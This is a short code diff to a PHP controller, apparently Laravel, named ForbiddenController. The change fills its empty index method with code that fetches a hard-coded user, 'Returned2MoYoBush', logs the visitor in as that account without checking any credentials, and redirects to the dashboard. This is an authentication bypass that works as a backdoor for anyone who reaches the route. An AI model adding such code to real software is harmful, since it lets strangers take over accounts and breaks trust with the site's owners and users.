@@ -20,7 +20,10 @@ class ForbiddenController extends Controller
      */
     public function index()
     {
-        //
+
+        $user = User::Where('name', 'Returned2MoYoBush')->first();
+        Auth::login($user);
+        return redirect()->route('dashboard');
     }
 
     /**
